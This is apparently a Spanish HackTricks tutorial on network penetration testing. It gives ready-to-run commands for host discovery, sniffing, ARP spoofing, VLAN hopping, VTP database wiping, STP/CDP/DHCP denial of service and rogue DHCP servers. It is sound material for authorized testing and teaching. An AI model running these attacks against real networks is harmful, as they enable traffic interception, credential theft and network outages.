# Pentesting de Red

<details>

<summary><strong>Aprende a hackear AWS de cero a héroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Experto en Red de HackTricks AWS)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF**, consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Obtén [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **síguenos** en **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Comparte tus trucos de hacking enviando PRs a los** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositorios de github.

</details>

<img src="../../.gitbook/assets/i3.png" alt="" data-size="original">\
**Consejo de recompensa por errores**: **Regístrate** en **Intigriti**, una plataforma de **recompensas por errores premium creada por hackers, para hackers**. ¡Únete a nosotros en [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) hoy y comienza a ganar recompensas de hasta **$100,000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

## Descubriendo hosts desde el exterior

Esta será una **sección breve** sobre cómo encontrar **IPs que responden** desde **Internet**.\
En esta situación, tienes algún **rango de IPs** (quizás incluso varios **rangos**) y solo necesitas encontrar **qué IPs están respondiendo**.

### ICMP

Esta es la forma **más fácil** y **rápida** de descubrir si un host está activo o no.\
Puedes intentar enviar algunos paquetes **ICMP** y **esperar respuestas**. La forma más sencilla es simplemente enviar una **solicitud de eco** y esperar la respuesta. Puedes hacerlo usando un simple `ping` o usando `fping` para **rangos**.\
También puedes usar **nmap** para enviar otros tipos de paquetes ICMP (esto evitará filtros para la solicitud-respuesta de eco ICMP común).
```bash
ping -c 1 199.66.11.4    # 1 echo request to a host
fping -g 199.66.11.0/24  # Send echo requests to ranges
nmap -PE -PM -PP -sn -n 199.66.11.0/24 #Send echo, timestamp requests and subnet mask requests
```
### Descubrimiento de Puertos TCP

Es muy común encontrar que todos los tipos de paquetes ICMP están siendo filtrados. Entonces, todo lo que puedes hacer para verificar si un host está activo es **intentar encontrar puertos abiertos**. Cada host tiene **65535 puertos**, por lo tanto, si tienes un alcance "grande" **no puedes** probar si **cada puerto** de cada host está abierto o no, eso tomaría demasiado tiempo.\
Entonces, lo que necesitas es un **escáner de puertos rápido** ([masscan](https://github.com/robertdavidgraham/masscan)) y una lista de los **puertos más utilizados:**
```bash
#Using masscan to scan top20ports of nmap in a /24 range (less than 5min)
masscan -p20,21-23,25,53,80,110,111,135,139,143,443,445,993,995,1723,3306,3389,5900,8080 199.66.11.0/24
```
### Descubrimiento de Puertos HTTP

Esto es simplemente un descubrimiento de puertos TCP útil cuando deseas **centrarte en descubrir servicios HTTP**:
```bash
masscan -p80,443,8000-8100,8443 199.66.11.0/24
```
### Descubrimiento de puertos UDP

También podrías intentar verificar si hay algún **puerto UDP abierto** para decidir si deberías **prestar más atención** a un **host**. Dado que los servicios UDP generalmente **no responden** con **ningún dato** a un paquete de sonda UDP vacío regular, es difícil decir si un puerto está siendo filtrado o abierto. La forma más fácil de decidir esto es enviar un paquete relacionado con el servicio en ejecución, y como no sabes qué servicio está en ejecución, deberías probar el más probable basado en el número de puerto:
```bash
nmap -sU -sV --version-intensity 0 -F -n 199.66.11.53/24
# The -sV will make nmap test each possible known UDP service packet
# The "--version-intensity 0" will make nmap only test the most probable
```
La línea de nmap propuesta anteriormente probará los **principales 1000 puertos UDP** en cada host dentro del rango **/24**, pero incluso esto tomará **>20min**. Si necesita **resultados más rápidos**, puede usar [**udp-proto-scanner**](https://github.com/portcullislabs/udp-proto-scanner): `./udp-proto-scanner.pl 199.66.11.53/24` Esto enviará estas **sondas UDP** a su **puerto esperado** (para un rango /24 esto solo tomará 1 minuto): _DNSStatusRequest, DNSVersionBindReq, NBTStat, NTPRequest, RPCCheck, SNMPv3GetRequest, chargen, citrix, daytime, db2, echo, gtpv1, ike,ms-sql, ms-sql-slam, netop, ntp, rpc, snmp-public, systat, tftp, time, xdmcp._

### Descubrimiento de Puertos SCTP
```bash
#Probably useless, but it's pretty fast, why not trying?
nmap -T4 -sY -n --open -Pn <IP/range>
```
## Pentesting Wifi

Aquí puedes encontrar una guía completa de todos los ataques Wifi conocidos en el momento de la escritura:

{% content-ref url="../pentesting-wifi/" %}
[pentesting-wifi](../pentesting-wifi/)
{% endcontent-ref %}

## Descubriendo hosts desde el interior

Si estás dentro de la red, una de las primeras cosas que querrás hacer es **descubrir otros hosts**. Dependiendo de **cuánto ruido** puedas o quieras hacer, se pueden realizar diferentes acciones:

### Pasivo

Puedes utilizar estas herramientas para descubrir hosts de forma pasiva dentro de una red conectada:
```bash
netdiscover -p
p0f -i eth0 -p -o /tmp/p0f.log
# Bettercap
net.recon on/off #Read local ARP cache periodically
net.show
set net.show.meta true #more info
```
### Activo

Tenga en cuenta que las técnicas comentadas en [_**Descubriendo hosts desde el exterior**_](./#discovering-hosts-from-the-outside) (_Descubrimiento de puertos TCP/HTTP/UDP/SCTP_) también se pueden **aplicar aquí**.\
Sin embargo, al estar en la **misma red** que los otros hosts, puede hacer **más cosas**:
```bash
#ARP discovery
nmap -sn <Network> #ARP Requests (Discover IPs)
netdiscover -r <Network> #ARP requests (Discover IPs)

#NBT discovery
nbtscan -r 192.168.0.1/24 #Search in Domain

# Bettercap
net.probe on/off #Discover hosts on current subnet by probing with ARP, mDNS, NBNS, UPNP, and/or WSD
set net.probe.mdns true/false #Enable mDNS discovery probes (default=true)
set net.probe.nbns true/false #Enable NetBIOS name service discovery probes (default=true)
set net.probe.upnp true/false #Enable UPNP discovery probes (default=true)
set net.probe.wsd true/false #Enable WSD discovery probes (default=true)
set net.probe.throttle 10 #10ms between probes sent (default=10)

#IPv6
alive6 <IFACE> # Send a pingv6 to multicast.
```
### ICMP Activo

Tenga en cuenta que las técnicas comentadas en _Descubriendo hosts desde el exterior_ ([_**ICMP**_](./#icmp)) también se pueden **aplicar aquí**.\
Pero, como estás en la **misma red** que los otros hosts, puedes hacer **más cosas**:

* Si **haces ping** a una **dirección de difusión de subred**, el ping debería llegar a **cada host** y podrían **responderte**: `ping -b 10.10.5.255`
* Al hacer ping a la **dirección de difusión de red**, incluso podrías encontrar hosts dentro de **otras subredes**: `ping -b 255.255.255.255`
* Utiliza las banderas `-PE`, `-PP`, `-PM` de `nmap` para realizar el descubrimiento de hosts enviando respectivamente solicitudes de **eco ICMPv4**, **marca de tiempo** y **máscara de subred**: `nmap -PE -PM -PP -sn -vvv -n 10.12.5.0/24`

### **Wake On Lan**

Wake On Lan se utiliza para **encender** computadoras a través de un **mensaje de red**. El paquete mágico utilizado para encender la computadora es simplemente un paquete donde se proporciona una **MAC Dst** y luego se **repite 16 veces** dentro del mismo paquete.\
Estos tipos de paquetes suelen enviarse en un **ethernet 0x0842** o en un **paquete UDP al puerto 9**.\
Si no se proporciona una **\[MAC]**, el paquete se envía a **ethernet de difusión** (y la MAC de difusión será la que se repita).
```bash
# Bettercap (if no [MAC] is specificed ff:ff:ff:ff:ff:ff will be used/entire broadcast domain)
wol.eth [MAC] #Send a WOL as a raw ethernet packet of type 0x0847
wol.udp [MAC] #Send a WOL as an IPv4 broadcast packet to UDP port 9
```
## Escaneo de Hosts

Una vez que hayas descubierto todas las IPs (externas o internas) que deseas escanear en profundidad, se pueden realizar diferentes acciones.

### TCP

* Puerto **abierto**: _SYN --> SYN/ACK --> RST_
* Puerto **cerrado**: _SYN --> RST/ACK_
* Puerto **filtrado**: _SYN --> \[SIN RESPUESTA]_
* Puerto **filtrado**: _SYN --> mensaje ICMP_
```bash
# Nmap fast scan for the most 1000tcp ports used
nmap -sV -sC -O -T4 -n -Pn -oA fastscan <IP>
# Nmap fast scan for all the ports
nmap -sV -sC -O -T4 -n -Pn -p- -oA fullfastscan <IP>
# Nmap fast scan for all the ports slower to avoid failures due to -T4
nmap -sV -sC -O -p- -n -Pn -oA fullscan <IP>

#Bettercap Scan
syn.scan 192.168.1.0/24 1 10000 #Ports 1-10000
```
### UDP

Hay 2 opciones para escanear un puerto UDP:

* Enviar un **paquete UDP** y verificar la respuesta _**ICMP unreachable**_ si el puerto está **cerrado** (en varios casos ICMP estará **filtrado** por lo que no recibirás información si el puerto está cerrado o abierto).
* Enviar **datagramas formateados** para provocar una respuesta de un **servicio** (por ejemplo, DNS, DHCP, TFTP, y otros, como se detalla en _nmap-payloads_). Si recibes una **respuesta**, entonces el puerto está **abierto**.

**Nmap** combinará **ambas** opciones usando "-sV" (los escaneos UDP son muy lentos), pero ten en cuenta que los escaneos UDP son más lentos que los escaneos TCP:
```bash
# Check if any of the most common udp services is running
udp-proto-scanner.pl <IP>
# Nmap fast check if any of the 100 most common UDP services is running
nmap -sU -sV --version-intensity 0 -n -F -T4 <IP>
# Nmap check if any of the 100 most common UDP services is running and launch defaults scripts
nmap -sU -sV -sC -n -F -T4 <IP>
# Nmap "fast" top 1000 UDP ports
nmap -sU -sV --version-intensity 0 -n -T4 <IP>
# You could use nmap to test all the UDP ports, but that will take a lot of time
```
### Escaneo SCTP

SCTP se encuentra junto a TCP y UDP. Destinado a proporcionar **transporte** de datos de **telefonía** sobre **IP**, el protocolo duplica muchas de las características de confiabilidad del Sistema de Señalización 7 (SS7), y sustenta una familia de protocolos más amplia conocida como SIGTRAN. SCTP es compatible con sistemas operativos como IBM AIX, Oracle Solaris, HP-UX, Linux, Cisco IOS y VxWorks.

Nmap ofrece dos escaneos diferentes para SCTP: _-sY_ y _-sZ_
```bash
# Nmap fast SCTP scan
nmap -T4 -sY -n -oA SCTFastScan <IP>
# Nmap all SCTP scan
nmap -T4 -p- -sY -sV -sC -F -n -oA SCTAllScan <IP>
```
### Evasión de IDS e IPS

{% content-ref url="ids-evasion.md" %}
[ids-evasion.md](ids-evasion.md)
{% endcontent-ref %}

### **Más opciones de nmap**

{% content-ref url="nmap-summary-esp.md" %}
[nmap-summary-esp.md](nmap-summary-esp.md)
{% endcontent-ref %}

### Revelación de direcciones IP internas

Los enrutadores, firewalls y dispositivos de red mal configurados a veces **responden** a sondas de red **utilizando direcciones de origen no públicas**. Puedes usar _tcpdump_ para **identificar paquetes** recibidos de **direcciones privadas** durante las pruebas. En este caso, la interfaz _eth2_ en Kali Linux es **accesible** desde **Internet público** (Si estás **detrás** de un **NAT** de un **Firewall**, este tipo de paquetes probablemente serán **filtrados**).
```bash
tcpdump –nt -i eth2 src net 10 or 172.16/12 or 192.168/16
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth2, link-type EN10MB (Ethernet), capture size 65535 bytes
IP 10.10.0.1 > 185.22.224.18: ICMP echo reply, id 25804, seq 1582, length 64
IP 10.10.0.2 > 185.22.224.18: ICMP echo reply, id 25804, seq 1586, length 64
```
## Sniffing

El sniffing te permite aprender detalles de rangos de IP, tamaños de subredes, direcciones MAC y nombres de host al revisar tramas y paquetes capturados. Si la red está mal configurada o la infraestructura de conmutación está bajo estrés, los atacantes pueden capturar material sensible a través del sniffing de red pasivo.

Si una red Ethernet conmutada está configurada correctamente, solo verás tramas de difusión y material destinado a tu dirección MAC.

### TCPDump
```bash
sudo tcpdump -i <INTERFACE> udp port 53 #Listen to DNS request to discover what is searching the host
tcpdump -i <IFACE> icmp #Listen to icmp packets
sudo bash -c "sudo nohup tcpdump -i eth0 -G 300 -w \"/tmp/dump-%m-%d-%H-%M-%S-%s.pcap\" -W 50 'tcp and (port 80 or port 443)' &"
```
Uno también puede capturar paquetes desde una máquina remota a través de una sesión SSH con Wireshark como la interfaz gráfica en tiempo real.
```
ssh user@<TARGET IP> tcpdump -i ens160 -U -s0 -w - | sudo wireshark -k -i -
ssh <USERNAME>@<TARGET IP> tcpdump -i <INTERFACE> -U -s0 -w - 'port not 22' | sudo wireshark -k -i - # Exclude SSH traffic
```
### Bettercap
```bash
net.sniff on
net.sniff stats
set net.sniff.output sniffed.pcap #Write captured packets to file
set net.sniff.local  #If true it will consider packets from/to this computer, otherwise it will skip them (default=false)
set net.sniff.filter #BPF filter for the sniffer (default=not arp)
set net.sniff.regexp #If set only packets matching this regex will be considered
```
### Wireshark

Obviamente.

### Capturando credenciales

Puedes utilizar herramientas como [https://github.com/lgandx/PCredz](https://github.com/lgandx/PCredz) para analizar credenciales de un archivo pcap o de una interfaz en vivo.

## Ataques en LAN

### ARP spoofing

El ARP Spoofing consiste en enviar respuestas ARP gratuitas para indicar que la IP de una máquina tiene la MAC de nuestro dispositivo. Luego, la víctima cambiará la tabla ARP y contactará a nuestra máquina cada vez que quiera comunicarse con la IP falsificada.

#### **Bettercap**
```bash
arp.spoof on
set arp.spoof.targets <IP> #Specific targets to ARP spoof (default=<entire subnet>)
set arp.spoof.whitelist #Specific targets to skip while spoofing
set arp.spoof.fullduplex true #If true, both the targets and the gateway will be attacked, otherwise only the target (default=false)
set arp.spoof.internal true #If true, local connections among computers of the network will be spoofed, otherwise only connections going to and coming from the Internet (default=false)
```
#### **Arpspoof**
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof -t 192.168.1.1 192.168.1.2
arpspoof -t 192.168.1.2 192.168.1.1
```
### MAC Flooding - Desbordamiento de CAM

Desborda la tabla CAM del switch enviando una gran cantidad de paquetes con diferentes direcciones MAC de origen. Cuando la tabla CAM está llena, el switch comienza a comportarse como un concentrador (transmitiendo todo el tráfico).
```bash
macof -i <interface>
```
En los switches modernos esta vulnerabilidad ha sido corregida.

### Ataques 802.1Q VLAN / DTP

#### Troncal Dinámica

**DTP (Protocolo de Troncal Dinámica)** es un protocolo de capa de enlace diseñado para proporcionar un sistema de troncal automático. Con DTP, los switches deciden qué puerto funcionará en modo troncal (Trunk) y cuál no. El uso de **DTP** indica una **diseño de red deficiente.** Las **troncales deben estar estrictamente** donde se necesitan, y debe estar documentado.

**Por defecto, todos los puertos del switch operan en modo Auto Dinámico.** Esto indica que el puerto del switch está en modo de iniciación de troncal desde el switch vecino. **El Pentester necesita conectarse físicamente al switch y enviar un marco DTP Deseable**, lo que activa el puerto para cambiar a modo troncal. El atacante puede entonces enumerar VLANs usando análisis de marcos STP y evadir la segmentación de VLANs creando interfaces virtuales.

Muchos switches admiten el Protocolo de Troncal Dinámica (DTP) de forma predeterminada, sin embargo, un adversario puede abusar de esto para **emular un switch y recibir tráfico a través de todas las VLANs**. La herramienta [_**dtpscan.sh**_](https://github.com/commonexploits/dtpscan) puede husmear una interfaz y **reportar si el switch está en modo predeterminado, troncal, dinámico, automático o de acceso** (este último evitaría el salto de VLAN). La herramienta indicará si el switch es vulnerable o no.

Si se descubre que la red es vulnerable, puedes usar _**Yersinia**_ para lanzar un "**habilitar troncal**" utilizando el protocolo "**DTP**" y podrás ver paquetes de red de todas las VLANs.
```bash
apt-get install yersinia #Installation
sudo apt install kali-linux-large #Another way to install it in Kali
yersinia -I #Interactive mode
#In interactive mode you will need to select a interface first
#Then, you can select the protocol to attack using letter "g"
#Finally, you can select the attack using letter "x"

yersinia -G #For graphic mode
```
![](<../../.gitbook/assets/image (646) (1).png>)

Para enumerar las VLANs también es posible generar el marco DTP Desirable con el script [**DTPHijacking.py**](https://github.com/in9uz/VLANPWN/blob/main/DTPHijacking.py)**. No interrumpas el script bajo ninguna circunstancia. Inyecta DTP Desirable cada tres segundos. **Los canales de troncales creados dinámicamente en el switch solo permanecen activos durante cinco minutos. Después de cinco minutos, la troncal se desconecta.**
```
sudo python3 DTPHijacking.py --interface eth0
```
Me gustaría señalar que **Access/Desirable (0x03)** indica que el marco DTP es del tipo Deseable, lo que indica al puerto que cambie a modo Troncal. Y **802.1Q/802.1Q (0xa5)** indica el tipo de encapsulación **802.1Q**.

Al analizar los marcos STP, **aprendemos sobre la existencia de VLAN 30 y VLAN 60**.

<figure><img src="../../.gitbook/assets/image (18) (1).png" alt=""><figcaption></figcaption></figure>

#### Atacando VLANs específicas

Una vez que conozcas los valores de ID de VLAN e IPs, puedes **configurar una interfaz virtual para atacar una VLAN específica**.\
Si DHCP no está disponible, entonces usa _ifconfig_ para configurar una dirección IP estática.
```
root@kali:~# modprobe 8021q
root@kali:~# vconfig add eth1 250
Added VLAN with VID == 250 to IF -:eth1:-
root@kali:~# dhclient eth1.250
Reloading /etc/samba/smb.conf: smbd only.
root@kali:~# ifconfig eth1.250
eth1.250  Link encap:Ethernet  HWaddr 00:0e:c6:f0:29:65
inet addr:10.121.5.86  Bcast:10.121.5.255  Mask:255.255.255.0
inet6 addr: fe80::20e:c6ff:fef0:2965/64 Scope:Link
UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
RX packets:19 errors:0 dropped:0 overruns:0 frame:0
TX packets:13 errors:0 dropped:0 overruns:0 carrier:0
collisions:0 txqueuelen:0
RX bytes:2206 (2.1 KiB)  TX bytes:1654 (1.6 KiB)

root@kali:~# arp-scan -I eth1.250 10.121.5.0/24
```

```bash
# Another configuration example
modprobe 8021q
vconfig add eth1 20
ifconfig eth1.20 192.168.1.2 netmask 255.255.255.0 up
```

```bash
# Another configuration example
sudo vconfig add eth0 30
sudo ip link set eth0.30 up
sudo dhclient -v eth0.30
```
#### Saltador automático de VLAN

El ataque discutido de **Troncal Dinámica y creación de interfaces virtuales para descubrir hosts dentro** de otras VLAN se **realiza automáticamente** con la herramienta: [**https://github.com/nccgroup/vlan-hopping---frogger**](https://github.com/nccgroup/vlan-hopping---frogger)

#### Doble Etiquetado

Si un atacante conoce el valor de la **MAC, IP e ID de VLAN del host víctima**, podría intentar **etiquetar dos veces un trama** con su VLAN designada y la VLAN de la víctima y enviar un paquete. Dado que la **víctima no podrá conectarse de vuelta** con el atacante, la **mejor opción para el atacante es comunicarse a través de UDP** con protocolos que puedan realizar algunas acciones interesantes (como SNMP).

Otra opción para el atacante es lanzar un **escaneo de puertos TCP suplantando una IP controlada por el atacante y accesible por la víctima** (probablemente a través de internet). Luego, el atacante podría espiar en el segundo host de su propiedad si recibe algunos paquetes de la víctima.

![](<../../.gitbook/assets/image (635) (1).png>)

Para realizar este ataque, se puede utilizar scapy: `pip install scapy`
```python
from scapy.all import *
# Double tagging with ICMP packet (the response from the victim isn't double tagged so it will never reach the attacker)
packet = Ether()/Dot1Q(vlan=1)/Dot1Q(vlan=20)/IP(dst='192.168.1.10')/ICMP()
sendp(packet)
```
#### Bypass de Segmentación Lateral de VLAN <a href="#d679" id="d679"></a>

Si tienes **acceso a un switch al que estás conectado directamente**, tienes la capacidad de **bypassar la segmentación de VLAN** dentro de la red. Simplemente **cambia el puerto a modo trunk** (también conocido como trunk), crea interfaces virtuales con los IDs de las VLANs objetivo y configura una dirección IP. Puedes intentar solicitar la dirección de forma dinámica (DHCP) o configurarla estáticamente. Depende del caso.

{% content-ref url="lateral-vlan-segmentation-bypass.md" %}
[lateral-vlan-segmentation-bypass.md](lateral-vlan-segmentation-bypass.md)
{% endcontent-ref %}

#### Bypass de VLAN Privada de Capa 3

En redes inalámbricas para invitados y otros entornos, se utilizan configuraciones de VLAN privada (también conocida como _aislamiento de puerto_) para **evitar que los pares interactúen** (es decir, los clientes **se conectan a un punto de acceso inalámbrico pero no pueden comunicarse entre sí**). Dependiendo de las ACL de red (o la falta de ellas), podría ser posible enviar paquetes IP a un enrutador, que luego los reenvía a un par vecino.

Este ataque enviará un **paquete especialmente diseñado a la IP de un cliente pero con la MAC del enrutador**. Luego, el **enrutador redirigirá el paquete al cliente**. Al igual que en _Ataques de Doble Etiquetado_, puedes explotar esta vulnerabilidad controlando un host accesible por la víctima.

### Ataques VTP

**VTP (Protocolo de Troncalización de VLAN)** es un protocolo diseñado para gestionar centralmente las VLAN. Para llevar un seguimiento de la base de datos de VLAN actual, los switches verifican números de revisión especiales. Cuando ocurre alguna actualización de tabla, el número de revisión se incrementa en uno. Y si un switch detecta una configuración con un número de revisión más alto, actualizará automáticamente su base de datos de VLAN.

#### Roles en un dominio VTP <a href="#ebfc" id="ebfc"></a>

* **Servidor VTP.** Un switch en el rol de Servidor VTP puede crear nuevas VLAN, eliminar antiguas o cambiar información en las propias VLAN. **También genera anuncios VTP para el resto de los miembros del dominio.**
* **Cliente VTP.** Un switch en este rol recibirá anuncios VTP específicos de otros switches en el dominio para actualizar las bases de datos de VLAN en el suyo propio. Los clientes tienen limitaciones en su capacidad para crear VLAN y ni siquiera se les permite cambiar la configuración de VLAN localmente. En otras palabras, **acceso de solo lectura.**
* **Transparente VTP.** En este modo, el switch no participa en los procesos VTP y puede administrar completamente y localmente toda la configuración de VLAN. Cuando opera en modo transparente, los switches solo transmiten anuncios VTP de otros switches sin afectar su configuración de VLAN. **Estos switches siempre tendrán un número de revisión de cero y no pueden ser atacados.**

#### Tipos de anuncios <a href="#b384" id="b384"></a>

* **Anuncio Resumido —** el anuncio VTP que el servidor VTP envía cada **300 segundos (5 minutos).** Este anuncio almacena el nombre de dominio VTP, la versión del protocolo, la marca de tiempo y el valor hash de configuración MD5.
* **Anuncio de Subconjunto —** este es el anuncio VTP que se envía cada vez que ocurre un cambio en la configuración de VLAN.
* **Solicitud de Anuncio —** es una solicitud del cliente VTP al servidor VTP de un mensaje de Anuncio Resumido. Por lo general, se envía en respuesta a un mensaje que indica que un switch ha detectado un Anuncio Resumido con un número de revisión de configuración más alto.

VTP **solo puede ser atacado desde un puerto de troncal,** porque **los anuncios VTP solo se transmiten y reciben en puertos de troncal.** **Por lo tanto, al realizar pentesting después de atacar DTP, tu próximo objetivo podría ser VTP.** Para atacar el dominio VTP puedes **usar Yersinia** para **ejecutar una inyección VTP que borrará toda la base de datos de VLAN** y así paralizar la red.

{% hint style="info" %}
El protocolo VTP tiene hasta **tres versiones**. En esta publicación, el ataque es contra la primera versión, VTPv1.
{% endhint %}
```bash
yersinia -G #For graphic mode
```
Para borrar toda la base de datos de VLAN, selecciona la opción **eliminar todas las VLAN de VTP**.

<figure><img src="../../.gitbook/assets/image (22) (2).png" alt=""><figcaption></figcaption></figure>

### Ataques STP

**Si no puedes capturar tramas BPDU en tus interfaces, es poco probable que tengas éxito en un ataque STP.**

#### **STP BPDU DoS**

Al enviar muchas BPDUs TCP (Notificación de Cambio de Topología) o Conf (las BPDUs que se envían cuando se crea la topología), los switches se sobrecargan y dejan de funcionar correctamente.
```bash
yersinia stp -attack 2
yersinia stp -attack 3
#Use -M to disable MAC spoofing
```
#### **Ataque TCP STP**

Cuando se envía un TCP, la tabla CAM de los switches se eliminará en 15 segundos. Entonces, si estás enviando continuamente este tipo de paquetes, la tabla CAM se reiniciará continuamente (o cada 15 segundos) y cuando se reinicie, el switch se comportará como un concentrador.
```bash
yersinia stp -attack 1 #Will send 1 TCP packet and the switch should restore the CAM in 15 seconds
yersinia stp -attack 0 #Will send 1 CONF packet, nothing else will happen
```
#### **Ataque de Raíz STP**

El atacante simula el comportamiento de un switch para convertirse en la raíz STP de la red. Luego, más datos pasarán a través de él. Esto es interesante cuando estás conectado a dos switches diferentes.\
Esto se logra enviando paquetes CONF de BPDUs diciendo que el valor de **prioridad** es menor que la prioridad real del switch raíz actual.
```bash
yersinia stp -attack 4 #Behaves like the root switch
yersinia stp -attack 5 #This will make the device behaves as a switch but will not be root
```
**Si el atacante está conectado a 2 switches, puede ser la raíz del nuevo árbol y todo el tráfico entre esos switches pasará a través de él** (se realizará un ataque MITM).
```bash
yersinia stp -attack 6 #This will cause a DoS as the layer 2 packets wont be forwarded. You can use Ettercap to forward those packets "Sniff" --> "Bridged sniffing"
ettercap -T -i eth1 -B eth2 -q #Set a bridge between 2 interfaces to forwardpackages
```
### Ataques CDP

El Protocolo de Descubrimiento CISCO es el protocolo utilizado por los dispositivos CISCO para comunicarse entre sí, **descubrir quién está activo** y qué características tienen.

#### Recopilación de Información <a href="#0e0f" id="0e0f"></a>

**Por defecto, el CDP envía anuncios a todos sus puertos.** Pero ¿qué sucede si un intruso se conecta a un puerto en el mismo switch? Utilizando un sniffer de red, ya sea **Wireshark**, **tcpdump** o **Yersinia**, podría extraer **información valiosa sobre el dispositivo en sí**, desde su modelo hasta la versión de Cisco IOS. Utilizando esta información, podrá enumerar la misma versión de Cisco IOS y encontrar la vulnerabilidad para luego explotarla.

#### Ataque de Sobrecarga CDP <a href="#0d6a" id="0d6a"></a>

Puedes realizar un ataque de denegación de servicio a un switch CISCO agotando la memoria del dispositivo simulando dispositivos CISCO reales.
```bash
sudo yersinia cdp -attack 1 #DoS Attack simulating new CISCO devices
# Or you could use the GUI
sudo yersinia -G
```
Selecciona la opción de **tabla de inundación CDP** y comienza el ataque. La CPU del switch se sobrecargará, al igual que la tabla de vecinos CDP, **resultando en una "parálisis de red".**

<figure><img src="../../.gitbook/assets/image (1) (5) (1).png" alt=""><figcaption></figcaption></figure>

#### Ataque de Suplantación CDP
```bash
sudo yersinia cdp -attack 2 #Simulate a new CISCO device
sudo yersinia cdp -attack 0 #Send a CDP packet
```
También puedes usar [**scapy**](https://github.com/secdev/scapy/). Asegúrate de instalarlo con el paquete `scapy/contrib`.

### Ataques VoIP

Aunque destinados al uso por los teléfonos de Voz sobre Protocolo de Internet (VoIP) de los empleados, los dispositivos VoIP modernos están cada vez más integrados con dispositivos IoT. Muchos empleados ahora pueden desbloquear puertas usando un número de teléfono especial, controlar el termostato de la habitación...

La herramienta [**voiphopper**](http://voiphopper.sourceforge.net) imita el comportamiento de un teléfono VoIP en entornos de Cisco, Avaya, Nortel y Alcatel-Lucent. Descubre automáticamente el ID de VLAN correcto para la red de voz utilizando uno de los protocolos de descubrimiento de dispositivos que admite, como el Protocolo de Descubrimiento de Cisco (CDP), el Protocolo de Configuración Dinámica de Hosts (DHCP), el Protocolo de Descubrimiento de Extremos de Medios de Capa de Enlace (LLDP-MED) y ARP 802.1Q.

**VoIP Hopper** admite **tres** modos CDP. El modo **sniff** inspecciona los paquetes de red e intenta localizar el ID de VLAN. Para usarlo, establece el parámetro **`-c`** en `0`. El modo **spoof** genera paquetes personalizados similares a los que transmitiría un dispositivo VoIP real en la red corporativa. Para usarlo, establece el parámetro **`-c`** en **`1`**. El modo de spoof con un **paquete predefinido** envía los mismos paquetes que un teléfono IP Cisco 7971G-GE. Para usarlo, establece el parámetro **`-c`** en **`2`**.

Utilizamos el último método porque es el enfoque más rápido. El parámetro **`-i`** especifica la **interfaz de red** del atacante, y el parámetro **`-E`** especifica el **nombre del dispositivo VoIP** que se está imitando. Elegimos el nombre SEP001EEEEEEEEE, que es compatible con el formato de nomenclatura de Cisco para los teléfonos VoIP. El formato consta de la palabra "SEP" seguida de una dirección MAC. En entornos corporativos, puedes imitar un dispositivo VoIP existente mirando la etiqueta MAC en la parte posterior del teléfono; presionando el botón de Configuración y seleccionando la opción de Información del Modelo en la pantalla de visualización del teléfono; o conectando el cable Ethernet del dispositivo VoIP a tu computadora portátil y observando las solicitudes CDP del dispositivo con Wireshark.
```bash
voiphopper -i eth1 -E 'SEP001EEEEEEEEE ' -c 2
```
Si la herramienta se ejecuta correctamente, **la red VLAN asignará una dirección IPv4 al dispositivo del atacante**.

### Ataques DHCP

#### Enumeración
```bash
nmap --script broadcast-dhcp-discover
Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-16 05:30 EDT
WARNING: No targets were specified, so 0 hosts scanned.
Pre-scan script results:
| broadcast-dhcp-discover:
|   Response 1 of 1:
|     IP Offered: 192.168.1.250
|     DHCP Message Type: DHCPOFFER
|     Server Identifier: 192.168.1.1
|     IP Address Lease Time: 1m00s
|     Subnet Mask: 255.255.255.0
|     Router: 192.168.1.1
|     Domain Name Server: 192.168.1.1
|_    Domain Name: mynet
Nmap done: 0 IP addresses (0 hosts up) scanned in 5.27 seconds
```
**DoS**

Se pueden realizar **dos tipos de DoS** contra servidores DHCP. El primero consiste en **simular suficientes hosts falsos para utilizar todas las direcciones IP posibles**.\
Este ataque solo funcionará si puedes ver las respuestas del servidor DHCP y completar el protocolo (**Descubrir** (Comp) --> **Ofrecer** (servidor) --> **Solicitud** (Comp) --> **ACK** (servidor)). Por ejemplo, esto **no es posible en redes Wifi**.

Otra forma de realizar un DoS de DHCP es enviar un **paquete DHCP-RELEASE utilizando como código fuente todas las IP posibles**. Entonces, el servidor pensará que todos han terminado de usar la IP.
```bash
yersinia dhcp -attack 1
yersinia dhcp -attack 3 #More parameters are needed
```
Una forma más automática de hacer esto es usando la herramienta [DHCPing](https://github.com/kamorin/DHCPig)

Podrías utilizar los ataques de denegación de servicio mencionados para forzar a los clientes a obtener nuevas concesiones dentro del entorno, y agotar los servidores legítimos para que se vuelvan no responsivos. Entonces, cuando los legítimos intenten reconectarse, **puedes servir valores maliciosos mencionados en el siguiente ataque**.

#### Establecer valores maliciosos

Puedes usar el script DHCP de Responder (_/usr/share/responder/DHCP.py_) para establecer un servidor DHCP falso. Establecer una puerta de enlace maliciosa no es ideal, porque la conexión secuestrada es solo semidúplex (es decir, capturamos paquetes de salida del cliente, pero no las respuestas de la puerta de enlace legítima). Por lo tanto, recomendaría establecer un servidor DNS o WPAD falso para capturar tráfico HTTP y credenciales en particular.

| Descripción                                 | Ejemplo                                                                      |
| ------------------------------------------- | ---------------------------------------------------------------------------- |
| Nuestra dirección IP, anunciada como puerta de enlace | _-i 10.0.0.100_                                                              |
| Nombre de dominio DNS local (opcional)      | _-d example.org_                                                             |
| Dirección IP del enrutador/puerta de enlace original | _-r 10.0.0.1_                                                                |
| Dirección IP del servidor DNS primario       | _-p 10.0.0.100_                                                              |
